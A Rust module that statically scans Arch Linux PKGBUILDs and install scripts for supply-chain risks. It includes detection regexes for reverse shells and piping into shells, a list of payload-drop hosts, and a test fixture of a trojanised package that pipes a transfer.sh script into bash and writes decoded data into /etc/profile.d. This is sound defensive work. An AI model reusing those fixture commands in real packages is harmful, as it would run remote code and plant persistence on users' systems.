//! Static analysis of a PKGBUILD and its install script. Nothing is executed:
//! bash is parsed just far enough to read variables, arrays and lines.

use std::collections::HashMap;
use std::sync::LazyLock;

use cirven_core::{Finding, Severity};
use regex::Regex;

/// Hosts used to drop payloads, never to publish real software releases.
const DROP_HOSTS: &[&str] = &[
    "pastebin.com",
    "paste.ee",
    "transfer.sh",
    "0x0.st",
    "file.io",
    "temp.sh",
    "bit.ly",
    "tinyurl.com",
    "cdn.discordapp.com",
    "media.discordapp.net",
    "anonfiles.com",
    "gofile.io",
    "ngrok.io",
    "ngrok-free.app",
    "trycloudflare.com",
];

/// Line patterns in build functions and install scripts, with severity and reason.
static SCRIPT_PATTERNS: LazyLock<Vec<(Severity, &str, Regex)>> = LazyLock::new(|| {
    [
        (
            Severity::High,
            "downloads during build or install, bypassing checksums",
            r"\b(curl|wget|aria2c)\s",
        ),
        (
            Severity::High,
            "pipes data into an interpreter",
            r"\|\s*(sudo\s+)?(ba|z|da)?sh\b|\|\s*python3?\b|\|\s*perl\b",
        ),
        (
            Severity::High,
            "decodes an embedded payload",
            r"base64\s+(-d|--decode)|xxd\s+-r|openssl\s+enc\s+-d",
        ),
        (
            Severity::High,
            "uses sudo inside the build",
            r"(^|[\s;&|(])sudo\s",
        ),
        (
            Severity::High,
            "reverse shell pattern",
            r"/dev/tcp/|\bnc(at)?\b.*\s-e\s|bash\s+-i\s*>&",
        ),
        (
            Severity::Medium,
            "evaluates generated code",
            r"(^|[\s;&|(])eval\s",
        ),
        (
            Severity::Medium,
            "installs a setuid binary",
            r"chmod\s+([ug]\+s|[0-7]?[4-7][0-7]{3})\b",
        ),
        (
            Severity::Medium,
            "enables a service from the install script",
            r"systemctl\s+(--now\s+)?enable",
        ),
        (
            Severity::Medium,
            "runs an inline interpreter",
            r"\b(python3?|perl|ruby|node)\s+-(c|e)\s",
        ),
    ]
    .into_iter()
    .map(|(s, why, re)| (s, why, Regex::new(re).expect("valid pattern")))
    .collect()
});

/// Writing to the live system instead of `$pkgdir` / `$srcdir`.
static LIVE_WRITE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(>>?|\b(cp|mv|install|ln|tee)\s[^#]*?)\s["']?/(etc|usr|var|boot|root|home)/"#)
        .expect("valid pattern")
});

static ASSIGN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"^([A-Za-z_][A-Za-z0-9_]*)=(?:"([^"]*)"|'([^']*)'|([^\s(#]*))"#)
        .expect("valid pattern")
});

pub struct Pkgbuild {
    pub vars: HashMap<String, String>,
    pub arrays: HashMap<String, Vec<String>>,
    pub text: String,
}

/// Split the inside of a bash array on whitespace, honouring quotes.
fn words(inner: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut quote: Option<char> = None;
    let mut in_word = false;
    for c in inner.chars() {
        match (quote, c) {
            (Some(q), c) if c == q => quote = None,
            (Some(_), c) => cur.push(c),
            (None, '"' | '\'') => {
                quote = Some(c);
                in_word = true;
            }
            (None, c) if c.is_whitespace() => {
                if in_word {
                    out.push(std::mem::take(&mut cur));
                    in_word = false;
                }
            }
            (None, c) => {
                cur.push(c);
                in_word = true;
            }
        }
    }
    if in_word {
        out.push(cur);
    }
    out
}

/// Strip a trailing comment that is outside quotes.
fn strip_comment(line: &str) -> &str {
    let mut quote = None;
    for (i, c) in line.char_indices() {
        match (quote, c) {
            (Some(q), c) if c == q => quote = None,
            (None, '"' | '\'') => quote = Some(c),
            (None, '#') if i == 0 || line[..i].ends_with(char::is_whitespace) => return &line[..i],
            _ => {}
        }
    }
    line
}

pub fn parse(text: &str) -> Pkgbuild {
    let mut vars = HashMap::new();
    let mut arrays = HashMap::new();
    let mut lines = text.lines();
    while let Some(raw) = lines.next() {
        let line = strip_comment(raw).trim();
        if let Some((name, rest)) = line.split_once("=(") {
            if name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
                let mut body = rest.to_string();
                while !body.trim_end().ends_with(')') {
                    match lines.next() {
                        Some(more) => {
                            body.push(' ');
                            body.push_str(strip_comment(more));
                        }
                        None => break,
                    }
                }
                let inner = body.trim_end().trim_end_matches(')');
                arrays.insert(name.to_string(), words(inner));
                continue;
            }
        }
        if let Some(c) = ASSIGN.captures(line) {
            let value = c
                .get(2)
                .or(c.get(3))
                .or(c.get(4))
                .map_or("", |m| m.as_str());
            vars.entry(c[1].to_string())
                .or_insert_with(|| value.to_string());
        }
    }
    let mut pb = Pkgbuild {
        vars,
        arrays,
        text: text.to_string(),
    };
    let expanded: HashMap<String, String> = pb
        .vars
        .iter()
        .map(|(k, v)| (k.clone(), pb.expand(v)))
        .collect();
    pb.vars = expanded;
    pb
}

impl Pkgbuild {
    /// Substitute `$var` and `${var}` with top-level values; leave the rest.
    pub fn expand(&self, s: &str) -> String {
        let mut out = s.to_string();
        for (k, v) in &self.vars {
            out = out
                .replace(&format!("${{{k}}}"), v)
                .replace(&format!("${k}"), v);
        }
        out
    }

    /// Every source entry, across architecture-specific arrays.
    pub fn sources(&self) -> Vec<String> {
        let mut keys: Vec<&String> = self
            .arrays
            .keys()
            .filter(|k| k.starts_with("source"))
            .collect();
        keys.sort();
        keys.iter()
            .flat_map(|k| self.arrays[*k].iter().map(|s| self.expand(s)))
            .collect()
    }
}

/// URL part of a source entry: drops `name::` and `git+` prefixes.
pub fn source_url(entry: &str) -> Option<String> {
    let url = entry.split_once("::").map_or(entry, |(_, u)| u);
    let url = url
        .trim_start_matches("git+")
        .trim_start_matches("hg+")
        .trim_start_matches("svn+");
    url.contains("://").then(|| url.to_string())
}

pub fn host(url: &str) -> Option<&str> {
    let rest = url.split_once("://")?.1;
    let host = rest.split(['/', '?', '#']).next()?;
    let host = host.rsplit_once('@').map_or(host, |(_, h)| h);
    Some(host.split(':').next().unwrap_or(host))
}

fn is_vcs(entry: &str) -> bool {
    let url = entry.split_once("::").map_or(entry, |(_, u)| u);
    ["git+", "hg+", "svn+", "bzr+"]
        .iter()
        .any(|p| url.starts_with(p))
        || url.ends_with(".git")
}

fn github_owner(url: &str) -> Option<String> {
    let rest = url.split_once("github.com/")?.1;
    rest.split('/').next().map(|o| o.to_ascii_lowercase())
}

fn sources(pb: &Pkgbuild, out: &mut Vec<Finding>) {
    let upstream_owner = pb.vars.get("url").and_then(|u| github_owner(u));
    for entry in pb.sources() {
        let Some(url) = source_url(&entry) else {
            continue;
        };
        let host = host(&url).unwrap_or("").to_ascii_lowercase();
        if host.parse::<std::net::IpAddr>().is_ok() {
            out.push(
                Finding::new(
                    "pkg.source-ip",
                    Severity::High,
                    "source downloads from a bare IP address",
                )
                .at(&url),
            );
        } else if DROP_HOSTS
            .iter()
            .any(|d| host == *d || host.ends_with(&format!(".{d}")))
        {
            out.push(
                Finding::new(
                    "pkg.source-drop-host",
                    Severity::High,
                    "source downloads from a paste or file-drop host",
                )
                .at(&url),
            );
        }
        if url.starts_with("http://") || url.starts_with("ftp://") {
            out.push(
                Finding::new(
                    "pkg.source-plaintext",
                    Severity::Medium,
                    "source downloaded without TLS",
                )
                .at(&url)
                .path(
                    "anyone on the network path can swap the file; only the checksum protects you",
                ),
            );
        }
        if let (Some(up), Some(src)) = (&upstream_owner, github_owner(&url))
            && *up != src
        {
            out.push(
                Finding::new("pkg.source-not-upstream", Severity::High, format!("source comes from github.com/{src}, upstream is github.com/{up}"))
                    .at(&url)
                    .path("a fork or personal repo instead of the project: classic way to ship a trojanised build"),
            );
        }
        if is_vcs(&entry) && !url.contains("#commit=") && !url.contains("#tag=") {
            out.push(
                Finding::new(
                    "pkg.vcs-unpinned",
                    Severity::Low,
                    "builds from a moving branch",
                )
                .at(&url)
                .path("whatever is pushed upstream at build time gets built and installed"),
            );
        }
    }
}

const ALGOS: &[&str] = &[
    "sha256sums",
    "sha512sums",
    "b2sums",
    "sha384sums",
    "sha224sums",
    "sha1sums",
    "md5sums",
    "cksums",
];

/// Each `source[_arch]` array pairs index by index with `<algo>sums[_arch]`.
fn checksums(pb: &Pkgbuild, out: &mut Vec<Finding>) {
    let mut keys: Vec<&String> = pb
        .arrays
        .keys()
        .filter(|k| k.starts_with("source"))
        .collect();
    keys.sort();
    for key in keys {
        let suffix = &key["source".len()..];
        let sums: Vec<&Vec<String>> = ALGOS
            .iter()
            .filter_map(|a| pb.arrays.get(&format!("{a}{suffix}")))
            .collect();
        for (i, entry) in pb.arrays[key].iter().enumerate() {
            let entry = pb.expand(entry);
            // Detached signatures are verified against validpgpkeys instead.
            let signature = [".asc", ".sig", ".sign"]
                .iter()
                .any(|ext| entry.ends_with(ext));
            if is_vcs(&entry) || source_url(&entry).is_none() || signature {
                continue;
            }
            let checked = sums.iter().any(|s| s.get(i).is_some_and(|v| v != "SKIP"));
            if !checked {
                out.push(
                    Finding::new(
                        "pkg.checksum-skipped",
                        Severity::Medium,
                        "downloaded file is not checksummed",
                    )
                    .at(source_url(&entry).unwrap_or_default())
                    .path("the file can change on the server and the build will not notice"),
                );
            }
        }
    }
    let has = |algo: &str| pb.arrays.keys().any(|k| k.starts_with(algo));
    let strong = ["sha256sums", "sha512sums", "b2sums", "sha384sums"]
        .iter()
        .any(|a| has(a));
    if !strong && (has("md5sums") || has("sha1sums")) {
        out.push(Finding::new(
            "pkg.checksum-weak",
            Severity::Low,
            "only md5 or sha1 checksums, both are broken",
        ));
    }
}

/// Pattern hits in a script, with 1-based line numbers. Source arrays and
/// comments are excluded; `origin` names the file for locations.
pub fn script(text: &str, origin: &str, out: &mut Vec<Finding>) {
    let mut in_array = false;
    for (n, raw) in text.lines().enumerate() {
        let line = strip_comment(raw).trim();
        if in_array {
            in_array = !line.ends_with(')');
            continue;
        }
        if let Some((name, rest)) = line.split_once("=(")
            && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        {
            in_array = !rest.trim_end().ends_with(')');
            continue;
        }
        if line.is_empty() {
            continue;
        }
        let at = format!("{origin}:{}", n + 1);
        for (severity, why, re) in SCRIPT_PATTERNS.iter() {
            if re.is_match(line) {
                out.push(
                    Finding::new("pkg.script", *severity, *why)
                        .at(&at)
                        .path(shorten(line)),
                );
            }
        }
        if LIVE_WRITE.is_match(line) && !line.contains("pkgdir") && !line.contains("srcdir") {
            out.push(
                Finding::new(
                    "pkg.live-write",
                    Severity::High,
                    "writes to the live system instead of the package",
                )
                .at(&at)
                .path(shorten(line)),
            );
        }
        if raw.len() > 400 {
            out.push(
                Finding::new(
                    "pkg.obfuscated",
                    Severity::Medium,
                    "very long line, often obfuscated code",
                )
                .at(&at),
            );
        }
    }
}

fn shorten(line: &str) -> String {
    let s: String = line.chars().take(100).collect();
    if line.chars().count() > 100 {
        format!("{s}…")
    } else {
        s
    }
}

/// All findings for a PKGBUILD and its install script, if any.
pub fn analyse(pkgbuild: &str, install: Option<(&str, &str)>) -> Vec<Finding> {
    let pb = parse(pkgbuild);
    let mut out = Vec::new();
    sources(&pb, &mut out);
    checksums(&pb, &mut out);
    script(pkgbuild, "PKGBUILD", &mut out);
    if let Some((name, text)) = install {
        script(text, name, &mut out);
    }
    out.sort_by_key(|f| std::cmp::Reverse(f.severity));
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    const CLEAN: &str = r#"
# Maintainer: someone
pkgname=ripgrep-bin
pkgver=14.1.0
pkgrel=1
url="https://github.com/BurntSushi/ripgrep"
source=("https://github.com/BurntSushi/ripgrep/releases/download/${pkgver}/ripgrep-${pkgver}-x86_64.tar.gz"
        'LICENSE::https://raw.githubusercontent.com/BurntSushi/ripgrep/master/LICENSE-MIT')
sha256sums=('4cf9f2741e6c465ffdb7c26f38056a59e2a2544b51f7cc128ef28337eeae4d8e'
            'c8a6e4b2b9f8e7d1a3b5c7d9e1f3a5b7c9d1e3f5a7b9c1d3e5f7a9b1c3d5e7f9')
package() {
  install -Dm755 "$srcdir/rg" "$pkgdir/usr/bin/rg"
}
"#;

    const TROJAN: &str = r#"
pkgname=firefox-patch-bin
pkgver=1.0
url="https://github.com/mozilla/gecko-dev"
source=("patch.py::https://github.com/someuser/browser-patch/raw/main/patch.py"
        "http://203.0.113.7/payload.tar.gz")
sha256sums=('SKIP' 'SKIP')
package() {
  install -Dm644 patch.py "$pkgdir/usr/share/x/patch.py"
  curl -s https://transfer.sh/abc/run.sh | bash
  echo 'Y3VybCB4' | base64 -d > /etc/profile.d/x.sh
}
"#;

    #[test]
    fn parses_vars_and_multiline_arrays() {
        let pb = parse(CLEAN);
        assert_eq!(pb.vars["pkgver"], "14.1.0");
        assert_eq!(pb.vars["url"], "https://github.com/BurntSushi/ripgrep");
        let src = pb.sources();
        assert_eq!(src.len(), 2);
        assert!(src[0].contains("/14.1.0/ripgrep-14.1.0-"));
        assert_eq!(pb.arrays["sha256sums"].len(), 2);
    }

    #[test]
    fn clean_package_has_no_findings() {
        assert!(
            analyse(CLEAN, None).is_empty(),
            "{:?}",
            analyse(CLEAN, None)
        );
    }

    #[test]
    fn trojanised_package_is_caught() {
        let f = analyse(TROJAN, None);
        let ids: Vec<&str> = f.iter().map(|f| f.id.as_str()).collect();
        for id in [
            "pkg.source-not-upstream",
            "pkg.source-ip",
            "pkg.source-plaintext",
            "pkg.checksum-skipped",
            "pkg.script",
            "pkg.live-write",
        ] {
            assert!(ids.contains(&id), "missing {id} in {ids:?}");
        }
        assert_eq!(f[0].severity, Severity::High);
        assert!(
            f.iter()
                .any(|f| f.location.as_deref() == Some("PKGBUILD:11"))
        );
    }

    #[test]
    fn install_scripts_are_scanned() {
        let install = "post_install() {\n  systemctl enable --now evil.service\n}\n";
        let f = analyse(CLEAN, Some(("x.install", install)));
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].location.as_deref(), Some("x.install:2"));
    }

    #[test]
    fn vcs_sources_need_no_checksum_but_should_be_pinned() {
        let pb = "pkgname=x-git\nsource=('git+https://github.com/a/x.git')\nsha256sums=('SKIP')\n";
        let ids: Vec<String> = analyse(pb, None).into_iter().map(|f| f.id).collect();
        assert_eq!(ids, ["pkg.vcs-unpinned"]);
        let pinned = "pkgname=x-git\nsource=('git+https://github.com/a/x.git#tag=v1')\nsha256sums=('SKIP')\n";
        assert!(analyse(pinned, None).is_empty());
    }

    #[test]
    fn arch_specific_sources_pair_with_arch_specific_sums() {
        let pb = "pkgname=x\nsource=('eula.html')\nsha512sums=('aa')\nsource_x86_64=('https://dl.example.com/x.deb')\nsha512sums_x86_64=('bb')\nsource_aarch64=('https://dl.example.com/y.deb')\nsha512sums_aarch64=('SKIP')\nsource_armv7h=('https://dl.example.com/z.tar.xz' 'https://dl.example.com/z.tar.xz.asc')\nsha512sums_armv7h=('cc' 'SKIP')\n";
        let f = analyse(pb, None);
        assert_eq!(f.len(), 1, "{f:?}");
        assert_eq!(
            f[0].location.as_deref(),
            Some("https://dl.example.com/y.deb")
        );
    }

    #[test]
    fn urls_and_hosts() {
        assert_eq!(
            source_url("a::git+https://h/x").as_deref(),
            Some("https://h/x")
        );
        assert_eq!(source_url("local.patch"), None);
        assert_eq!(host("https://user@example.org:8443/x"), Some("example.org"));
        assert_eq!(words(r#"'a b' "c" d"#), ["a b", "c", "d"]);
    }
}
